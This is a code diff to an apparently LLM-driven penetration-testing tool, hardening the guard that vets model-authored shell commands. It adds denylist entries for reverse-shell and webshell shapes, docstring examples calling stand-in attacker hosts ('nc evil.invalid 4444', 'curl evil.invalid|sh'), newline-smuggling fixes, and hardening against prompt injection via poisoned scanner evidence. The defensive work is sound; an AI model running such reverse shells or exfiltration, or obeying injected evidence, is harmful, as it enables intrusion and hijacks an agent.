@@ -195,6 +195,13 @@ _DESTRUCTIVE_PATTERNS = (
     # webshell drop (write executable content into a server path)
     ".php.jpg", "<?php", "system($_", "passthru($_", "shell_exec($_",
     "eval($_", "move_uploaded_file",
+    # reverse-shell / shell-spawn SHAPES — blocked regardless of host so a
+    # poisoned-evidence-steered nc/bash/python/socat reverse shell cannot reach
+    # /bin/sh even when it targets an in-scope host or carries no URL scheme.
+    "-e /bin/sh", "-e /bin/bash", "-e/bin/sh", "-e/bin/bash", "-e sh", "-e bash",
+    "-c /bin/sh", "-c /bin/bash", "/dev/tcp/", "/dev/udp/", "bash -i", "sh -i",
+    "os.system(", "os.popen(", "pty.spawn", "subprocess.", "exec:'", 'exec:"',
+    "exec:/bin", "|sh", "| sh", "|bash", "| bash",
 )
 # A bare unbounded DELETE (DELETE ... without a WHERE) — flagged separately so a
 # scoped "DELETE FROM t WHERE id=1" PoC is not blocked.
@@ -212,18 +219,24 @@ def _truncate_note(text: str, limit: int) -> str:
     return text[:limit] + f"\n... [truncated {dropped} chars from this AI summary input]"
 
 
-def guard_command(cmd: str) -> tuple[bool, str]:
+def guard_command(cmd: str, allow_destructive: bool = False) -> tuple[bool, str]:
     """Decide whether an LLM-authored command may be executed.
 
     Returns (allowed, reason). ``reason`` is '' when allowed, otherwise a short
     human-readable rejection. The single safety choke point for run_command().
+
+    ``allow_destructive`` (caller-supplied) lifts the destructive/exfil DENYLIST only —
+    used by the explicit --sqli-rce/--allow-exploit opt-in so the os-shell/file-write
+    escalation it exists to run is not dead-pathed by the denylist. It NEVER lifts the
+    binary allowlist (that still requires BRAIN_ALLOW_ANY_CMD=1).
     """
     raw = (cmd or "").strip()
     if not raw:
         return False, "empty command"
 
     allow_any = os.environ.get("BRAIN_ALLOW_ANY_CMD") == "1"
-    allow_destructive = allow_any or os.environ.get("BRAIN_ALLOW_DESTRUCTIVE") == "1"
+    allow_destructive = (allow_destructive or allow_any
+                         or os.environ.get("BRAIN_ALLOW_DESTRUCTIVE") == "1")
 
     low = raw.lower()
 
@@ -260,37 +273,88 @@ def guard_command(cmd: str) -> tuple[bool, str]:
     # '|' INSIDE a quoted argument (e.g. a python -c payload, a JSON body) is data, not a
     # new stage. shlex with punctuation_chars tokenizes operators as their own tokens
     # while respecting quoting.
-    try:
-        lex = shlex.shlex(raw, posix=True, punctuation_chars="();<>|&")
-        lex.whitespace_split = True
-        tokens = list(lex)
-    except ValueError:
-        return False, "unparseable command (unbalanced quotes?) blocked"
+    #
+    # CRITICAL: shlex with whitespace_split treats '\n' as ordinary whitespace, so a
+    # NEWLINE would NOT start a new stage even though /bin/sh -c treats it as a command
+    # separator. That let `curl <allowlisted-url>\n<arbitrary-binary>` smuggle an
+    # un-allowlisted program past the per-stage check. We therefore tokenize EACH
+    # physical (newline-delimited) line separately and require every line's stages to be
+    # allowlisted — a line boundary is an implicit, non-bypassable stage break. We split
+    # on real newlines only OUTSIDE quotes by using shlex per-line; a newline inside a
+    # quoted argument keeps that argument on one logical line via the unterminated-quote
+    # retry below.
+    raw_lines = raw.split("\n")
+    pending = ""
+    logical_lines: list[str] = []
+    for ln in raw_lines:
+        candidate = (pending + "\n" + ln) if pending else ln
+        # A quote that opened on a previous physical line (multi-line quoted payload)
+        # leaves shlex unbalanced; in that case keep accumulating so the quoted newline
+        # stays DATA rather than being treated as a separator.
+        try:
+            shlex.split(candidate, posix=True)
+            logical_lines.append(candidate)
+            pending = ""
+        except ValueError:
+            pending = candidate
+    if pending:
+        logical_lines.append(pending)
 
     _OPERATORS = {";", "|", "||", "&", "&&", "(", ")", "<", ">", "<<", ">>"}
-    stages: list[list[str]] = [[]]
-    for tok in tokens:
-        if tok in _OPERATORS:
-            stages.append([])
-        else:
-            stages[-1].append(tok)
-
     bad = []
-    for stage_toks in stages:
-        if not stage_toks:
+    for logical in logical_lines:
+        if not logical.strip():
             continue
-        i = 0
-        while i < len(stage_toks) and re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", stage_toks[i]):
-            i += 1
-        if i < len(stage_toks) and stage_toks[i] == "env":
-            i += 1
+        try:
+            lex = shlex.shlex(logical, posix=True, punctuation_chars="();<>|&")
+            lex.whitespace_split = True
+            tokens = list(lex)
+        except ValueError:
+            return False, "unparseable command (unbalanced quotes?) blocked"
+
+        stages: list[list[str]] = [[]]
+        for tok in tokens:
+            if tok in _OPERATORS:
+                stages.append([])
+            else:
+                stages[-1].append(tok)
+
+        for stage_toks in stages:
+            if not stage_toks:
+                continue
+            i = 0
             while i < len(stage_toks) and re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", stage_toks[i]):
                 i += 1
-        if i >= len(stage_toks):
-            continue
-        prog = os.path.basename(stage_toks[i])
-        if prog not in _CMD_ALLOWLIST:
-            bad.append(prog)
+            # Unwrap launcher/wrapper binaries (env / timeout / xargs) so the program
+            # they ACTUALLY exec is the one validated against the allowlist — otherwise
+            # `timeout 60 /tmp/evil` or `xargs /tmp/evil` would pass on the wrapper alone.
+            while i < len(stage_toks) and os.path.basename(stage_toks[i]) in ("env", "timeout", "xargs"):
+                wrapper = os.path.basename(stage_toks[i])
+                i += 1
+                if wrapper == "env":
+                    # skip VAR=VALUE assignments env consumes
+                    while i < len(stage_toks) and re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", stage_toks[i]):
+                        i += 1
+                elif wrapper == "timeout":
+                    # skip leading option flags, then the (single) duration argument
+                    while i < len(stage_toks) and stage_toks[i].startswith("-"):
+                        i += 1
+                    if i < len(stage_toks) and re.match(r"^\d+(\.\d+)?[smhd]?$", stage_toks[i]):
+                        i += 1
+                elif wrapper == "xargs":
+                    # skip option flags (and the arg some take, e.g. -I {} / -n 1);
+                    # the next non-flag token is the program xargs will exec.
+                    while i < len(stage_toks) and stage_toks[i].startswith("-"):
+                        flag = stage_toks[i]
+                        i += 1
+                        if flag in ("-I", "-n", "-P", "-L", "-s", "-d", "-E", "-a") and \
+                           i < len(stage_toks) and not stage_toks[i].startswith("-"):
+                            i += 1
+            if i >= len(stage_toks):
+                continue
+            prog = os.path.basename(stage_toks[i])
+            if prog not in _CMD_ALLOWLIST:
+                bad.append(prog)
     if bad:
         return False, (f"binary not in allowlist: {', '.join(sorted(set(bad)))} "
                        f"(set BRAIN_ALLOW_ANY_CMD=1 to override)")
@@ -1393,6 +1457,11 @@ Keep it under 80 words total."""
         add_section("IDOR Candidates", findings_path / "idor" / "idor_candidates.txt", 1400)
         for rce_file in sorted((findings_path / "rce").glob("RCE_CONFIRMED*.txt"))[:3]:
             add_section(f"Confirmed RCE Artifact: {rce_file.name}", rce_file, 1600)
+        # Grounded confirmed-impact lines promoted by exploit_finding()'s autonomous
+        # loop — so a proven escalation reaches the report instead of dying in the
+        # transcript. Gated behind --sqli-rce/--allow-exploit (file absent otherwise).
+        add_section("Confirmed Exploit Impact (brain loop)",
+                    findings_path / "brain" / "confirmed_exploits.txt", 1800)
 
         # Email authentication posture (email_auth/findings.json). The reporter
         # ingests this JSON list (Method 1d) and emits SPF/DKIM/DMARC/DNSSEC/
@@ -1680,26 +1749,84 @@ Keep it under 80 words total."""
 
     @staticmethod
     def _command_offscope_host(cmd: str, scope_host: str) -> str | None:
-        """Return the first URL host in ``cmd`` that is NOT the authorized
-        ``scope_host`` (case-insensitive, port/userinfo stripped), or None when the
-        command targets only the in-scope host. When ``scope_host`` is empty (unknown)
-        we cannot enforce and return None. localhost/loopback are deferred to scopeguard.
+        """Return the first host in ``cmd`` that is NOT the authorized ``scope_host``
+        (case-insensitive, port/userinfo stripped), or None when the command targets
+        only the in-scope host (or its subdomains). When ``scope_host`` is empty
+        (unknown) we cannot enforce and return None. localhost/loopback are allowed
+        (deferred to scopeguard).
+
+        Detection is SCHEME-AGNOSTIC: a bare-host reverse shell (``nc evil.invalid
+        4444``), a schemeless exfil (``curl evil.invalid|sh``), and a socat target
+        (``socat ... TCP:evil.invalid:4444``) are all caught, not just http(s):// URLs.
+        Additionally, curl/wget host-override flags (``--resolve``, ``--connect-to``,
+        ``-x/--proxy`` and a ``Host:`` header) are validated so the visible URL cannot
+        read in-scope while the real TCP target is attacker-controlled.
         """
         if not scope_host:
             return None
-        for m in re.finditer(r"https?://([^/\s'\"\\)>|;&]+)", cmd or "", re.I):
-            netloc = m.group(1)
-            host = netloc.split("@")[-1].split(":")[0].lower()
+        cmd = cmd or ""
+
+        def _in_scope(host: str) -> bool:
+            host = (host or "").split("@")[-1].split(":")[0].strip().lower().rstrip(".")
             if not host:
-                continue
-            if host == scope_host:
-                continue
-            # Allow same-site sub/parent (scope_host endswith host or vice-versa only
-            # when it is a real label boundary) — keep strict: exact match required,
-            # except the in-scope host's own subdomains.
-            if host.endswith("." + scope_host):
-                continue
-            return host
+                return True  # nothing host-like to enforce
+            if host in ("localhost", "127.0.0.1", "::1", "0.0.0.0"):
+                return True
+            if host == scope_host or host.endswith("." + scope_host):
+                return True
+            return False
+
+        # (1) Explicit URLs with a scheme.
+        for m in re.finditer(r"[a-zA-Z][a-zA-Z0-9+.-]*://([^/\s'\"\\)>|;&]+)", cmd, re.I):
+            host = m.group(1)
+            if not _in_scope(host):
+                return host.split("@")[-1].split(":")[0].lower().rstrip(".")
+
+        # (2) curl/wget host-override flags + Host: header — the on-wire host can
+        #     differ from the visible URL. Validate each against scope.
+        for m in re.finditer(r"--resolve[=\s]+([^\s'\"]+)", cmd):
+            # format: <host>:<port>:<addr>
+            host = m.group(1).split(":")[0]
+            if not _in_scope(host):
+                return host.lower()
+        for m in re.finditer(r"--connect-to[=\s]+([^\s'\"]+)", cmd):
+            # format: <host1>:<port1>:<host2>:<port2>
+            parts = m.group(1).split(":")
+            host2 = parts[2] if len(parts) >= 3 else ""
+            if host2 and not _in_scope(host2):
+                return host2.lower()
+        for m in re.finditer(r"(?:-x|--proxy)[=\s]+([^\s'\"]+)", cmd):
+            netloc = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", "", m.group(1))
+            host = netloc.split("/")[0]
+            if not _in_scope(host):
+                return host.split("@")[-1].split(":")[0].lower()
+        # Host: header — require a boundary before "host" so we don't match the tail
+        # of "localhost:" / "myhost:". Only a real header (quote/space/comma/colon
+        # boundary, or start) counts.
+        for m in re.finditer(r"(?i)(?:^|[\s'\":,;])host:\s*([^\s'\"\\/]+)", cmd):
+            host = m.group(1)
+            if not _in_scope(host):
+                return host.lower()
+
+        # (3) Schemeless host literals as bare argv tokens — reverse-shell / exfil
+        #     targets (nc/ncat/socat/curl). Tokenize and inspect each token for a
+        #     hostname or IP that is not in scope. Anything containing a metachar or
+        #     '=' or a path is left to the URL/flag passes above.
+        try:
+            toks = shlex.split(cmd, posix=True)
+        except ValueError:
+            toks = cmd.split()
+        host_like = re.compile(
+            r"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$"  # fqdn
+            r"|^(?:\d{1,3}\.){3}\d{1,3}$"                                            # ipv4
+        )
+        # socat-style ADDRESS:host:port and pipe/seq-glued hosts (evil.invalid|sh) —
+        # pull the embedded host out first by splitting on shell-ish delimiters.
+        for tok in toks:
+            for piece in re.split(r"[:,|&;()<>]", tok):
+                piece = piece.strip().rstrip(".")
+                if host_like.match(piece) and not _in_scope(piece):
+                    return piece.lower()
         return None
 
     # ─────────────────────────────────────────────────────────────────────────
@@ -2367,6 +2494,12 @@ Give me:
 
         meta = meta or {}
         import subprocess as _sp
+        # Fork-safe spawner: this runs inside the watchdog thread of the long-lived
+        # brain process, AFTER in-process LLM HTTP has loaded macOS Network.framework.
+        # Raw subprocess fork()+exec SIGSEGVs the child (rc=-11, empty output), which
+        # would make every tool falsely read NOT FOUND and feed a bogus "all tools
+        # missing" picture to the diagnosis prompt. Route through posix_spawn.
+        import procutil
 
         command = meta.get("command", "(not provided)")
         effective_path = meta.get("effective_path", os.environ.get("PATH", "(not set)"))
@@ -2429,14 +2562,11 @@ Give me:
 
         def _resolve(binary: str) -> str:
             try:
-                result = _sp.run(
-                    ["/bin/sh", "-lc", f"command -v {shlex.quote(binary)}"],
-                    capture_output=True,
-                    text=True,
-                    timeout=3,
-                    env=env,
+                res = procutil.run_capture(
+                    f"command -v {shlex.quote(binary)}",
+                    timeout=3, env=env, shell=True, merge_stderr=False,
                 )
-                return result.stdout.strip()
+                return (res.get("stdout") or "").strip()
             except Exception:
                 return ""
 
@@ -2454,9 +2584,11 @@ Give me:
             path = _resolve(cmd[0])
             if path:
                 try:
-                    ver = _sp.check_output(
-                        cmd, stderr=_sp.STDOUT, text=True, timeout=3, env=env
-                    ).strip().splitlines()[0][:80]
+                    _vres = procutil.run_capture(
+                        " ".join(shlex.quote(c) for c in cmd),
+                        timeout=3, env=env, shell=True, merge_stderr=True,
+                    )
+                    ver = (_vres.get("stdout") or "").strip().splitlines()[0][:80]
                     tool_checks.append(f"  {tool_name}: {path} → {ver}")
                 except Exception:
                     tool_checks.append(f"  {tool_name}: {path} (version check failed)")
@@ -2466,13 +2598,10 @@ Give me:
 
         # ── 4. PATH inspection for the child process environment ─────────────
         try:
-            httpx_all = _sp.run(
-                ["/bin/sh", "-lc", "which -a httpx"],
-                capture_output=True,
-                text=True,
-                timeout=3,
-                env=env,
-            ).stdout.strip() or "(not found)"
+            _hres = procutil.run_capture(
+                "which -a httpx", timeout=3, env=env, shell=True, merge_stderr=False,
+            )
+            httpx_all = (_hres.get("stdout") or "").strip() or "(not found)"
         except Exception as exc:
             httpx_all = f"(resolution failed: {exc})"
 
@@ -2624,7 +2753,11 @@ NEXT ACTION: <one concrete action>
         # Safety choke point: refuse destructive/exfil or non-allowlisted LLM-authored
         # commands BEFORE they reach the shell. Overridable via BRAIN_ALLOW_DESTRUCTIVE=1
         # / BRAIN_ALLOW_ANY_CMD=1 for authorized destructive testing.
-        _allowed, _reason = guard_command(cmd)
+        # When the operator explicitly opted into exploitation (--sqli-rce /
+        # --allow-exploit), lift the destructive denylist so the os-shell/file-write
+        # escalation the exploit loop is DESIGNED to run is not silently dead-pathed.
+        # The binary allowlist is unaffected and still applies.
+        _allowed, _reason = guard_command(cmd, allow_destructive=bool(getattr(self, "allow_exploit", False)))
         if not _allowed:
             return -1, "", f"COMMAND BLOCKED (guard): {_reason}"
         env = {**os.environ, "PATH": f"{os.path.expanduser('~/go/bin')}:{os.environ.get('PATH', '')}"}
@@ -2774,10 +2907,23 @@ NEXT ACTION: <one concrete action>
           3. Feeds output back and iterates (up to 6 rounds)
           4. Saves final proof-of-concept to findings_dir/brain/exploits/
 
-        Returns the full conversation transcript.
+        Returns ``(full_transcript, confirmed_impact)`` where ``confirmed_impact`` is the
+        grounded ``CONFIRMED:`` impact line (or "" if the loop never proved impact). When
+        the loop is gated/disabled, returns ``("# ...gated...\n", "")``.
         """
         if not self.enabled:
-            return ""
+            return "", ""
+
+        # Enforce the documented "OFF by default" invariant at the FUNCTION boundary,
+        # not just at the auto_triage_and_exploit caller. The exploit loop runs
+        # model-generated commands against the live target; require the explicit
+        # opt-in (--sqli-rce / --allow-exploit) regardless of which caller reached here.
+        if not getattr(self, "allow_exploit", False):
+            msg = ("exploit_finding requires the explicit exploitation opt-in "
+                   "(--sqli-rce / --allow-exploit); refusing to run the autonomous "
+                   "exploit loop.")
+            print(f"{YELLOW}[Brain] {msg}{NC}")
+            return f"# Exploit gated\n{msg}\n", ""
 
         # ── Indirect-prompt-injection hardening ──────────────────────────────────
         # ``evidence`` is attacker-controllable scanner output (e.g. a reflected
@@ -2798,11 +2944,12 @@ NEXT ACTION: <one concrete action>
             msg = (f"Refusing to run exploit loop: target_url contains shell "
                    f"metacharacters/whitespace and is not a safe URL: {target_url!r}")
             print(f"{YELLOW}[Brain] {msg}{NC}")
-            return f"# Exploit aborted\n{msg}\n"
+            return f"# Exploit aborted\n{msg}\n", ""
 
         # Host-scope: the authorized host is the netloc of target_url. Emitted commands
-        # may only touch that host (or scopeguard's in-scope set). Computed once here
-        # and checked against each generated command before execution.
+        # may only touch that host or its subdomains (scopeguard is NOT consulted here —
+        # _command_offscope_host enforces a single-host allowlist, fail-closed). Computed
+        # once here and checked against each generated command before execution.
         try:
             scope_host = urlsplit(target_url).netloc.split("@")[-1].split(":")[0].lower()
         except Exception:
@@ -2918,8 +3065,22 @@ Based on this:
             print(f"{GREEN}[Brain] Exploit log → {out_file}{NC}")
             if confirmed_impact:
                 print(f"{GREEN}[Brain] CONFIRMED IMPACT: {confirmed_impact}{NC}")
+                # Promote the GROUNDED confirmed impact into a report-visible artifact
+                # so write_report()/_build_report_evidence() reflect the upgraded verdict
+                # instead of leaving the proof only in the transcript + console.
+                try:
+                    confirmed_path = Path(findings_dir) / "brain" / "confirmed_exploits.txt"
+                    confirmed_path.parent.mkdir(parents=True, exist_ok=True)
+                    with open(confirmed_path, "a", encoding="utf-8") as _cf:
+                        _cf.write(f"[CONFIRMED] {vuln_type} @ {target_url}\n"
+                                  f"  impact: {confirmed_impact}\n"
+                                  f"  transcript: {out_file}\n\n")
+                except OSError:
+                    pass
 
-        return full_transcript
+        # Return (transcript, confirmed_impact) so callers can upgrade the structured
+        # verdict. ``confirmed_impact`` is "" when no grounded CONFIRMED: line was emitted.
+        return full_transcript, confirmed_impact
 
     def auto_triage_and_exploit(self, findings_dir: str,
                                 recon_dir: str = "") -> list[dict]:
@@ -2984,28 +3145,51 @@ Based on this:
                     print(_msg)
                     triage_summary.append(_msg)
                     continue
-                self.exploit_finding(
+                _transcript, _impact = self.exploit_finding(
                     target_url=target_url,
                     vuln_type=cat,
                     evidence=line,
                     findings_dir=findings_dir,
                 )
+                # Promote a GROUNDED confirmed impact back into the structured verdict so
+                # the report reflects the proven escalation (was previously left only in
+                # the transcript file + console).
+                if _impact:
+                    result["verdict"] = "CONFIRMED"
+                    result["reasoning"] = (f"CONFIRMED via exploit loop: {_impact} | "
+                                           + result.get("reasoning", ""))[:300]
+                    triage_summary.append(f"[CONFIRMED] [{cat}] {_impact[:120]}")
                 # v9.5.0 — fire a PD `notify` ping to the engagement channel
                 # when a SUBMIT verdict lands during a long autonomous run.
                 # Best-effort; silent if notify isn't installed or no
                 # provider is configured in ~/.config/notify/provider-config.yaml.
                 try:
                     import shutil as _sh
-                    import subprocess as _sub
+                    import procutil
                     if verdict == "SUBMIT" and _sh.which("notify"):
                         msg = f"[Vikramaditya/{target}] {cat.upper()} SUBMIT-verdict finding: {line[:200]}"
-                        proc = _sub.Popen(
-                            ["notify", "-bulk", "-silent", "-id", "vikramaditya-submit"],
-                            stdin=_sub.PIPE, stdout=_sub.DEVNULL, stderr=_sub.DEVNULL,
-                        )
-                        proc.communicate(input=msg.encode(), timeout=10)
-                except Exception:
-                    pass
+                        # Fork-safe launch: raw subprocess.Popen here uses fork()+exec,
+                        # which SIGSEGVs (rc=-11) on macOS once Network.framework is
+                        # loaded by the in-process LLM HTTP above — silently dropping the
+                        # ping. Feed the message via a temp file + shell redirect through
+                        # the posix_spawn helper (notify reads its body from stdin).
+                        import tempfile as _tf
+                        _fd, _msgpath = _tf.mkstemp(prefix="vik_notify_", suffix=".txt")
+                        try:
+                            with os.fdopen(_fd, "w", encoding="utf-8") as _mf:
+                                _mf.write(msg)
+                            _nproc = procutil._fork_safe_spawn(
+                                f"notify -bulk -silent -id vikramaditya-submit < {shlex.quote(_msgpath)}",
+                                capture=True, shell=True, merge_stderr=True,
+                            )
+                            _nproc.communicate(timeout=10)
+                        finally:
+                            try:
+                                os.unlink(_msgpath)
+                            except OSError:
+                                pass
+                except Exception as _exc:
+                    print(f"{YELLOW}[Brain] notify ping skipped: {_exc}{NC}")
 
         # Save triage summary
         summary_md = (
@@ -3094,10 +3278,16 @@ Rules:
         code = "\n".join(ln for ln in code.splitlines() if "/path/to/" not in ln).strip()
         if not code.startswith("#!"):
             code = "#!/bin/bash\n" + code
-        import subprocess as _sp
+        # Fork-safe bash -n: raw subprocess fork()+exec SIGSEGVs (rc=-11) on macOS once
+        # the in-process LLM HTTP above loaded Network.framework, which would mislabel
+        # EVERY valid scan plan as failed. Route through posix_spawn (matches run_command).
+        import procutil
         try:
-            _chk = _sp.run(["bash", "-n", "-c", code], capture_output=True, text=True, timeout=15)
-            valid = (_chk.returncode == 0)
+            _proc = procutil._fork_safe_spawn(
+                ["bash", "-n", "-c", code], capture=True, shell=False, merge_stderr=True,
+            )
+            _proc.communicate(timeout=15)
+            valid = (_proc.returncode == 0)
         except Exception:
             valid = False
         if not valid:
@@ -3295,6 +3485,14 @@ Examples:
         else:
             finding = args.finding
         vuln_type = getattr(args, "vuln_type", None) or "unknown"
+        # --phase exploit IS the manual escalation tool, but still require the explicit
+        # exploitation opt-in so the "OFF by default" invariant holds at every entry
+        # point (mirrors the autopilot branch). Default --allow-exploit to True here
+        # only if the operator passed it; otherwise the function-boundary gate refuses.
+        brain.allow_exploit = bool(getattr(args, "allow_exploit", False))
+        if not brain.allow_exploit:
+            parser.error("--phase exploit requires --allow-exploit (the autonomous "
+                         "exploit loop runs model-generated commands against the target)")
         brain.exploit_finding(
             target_url=args.url,
             vuln_type=vuln_type,
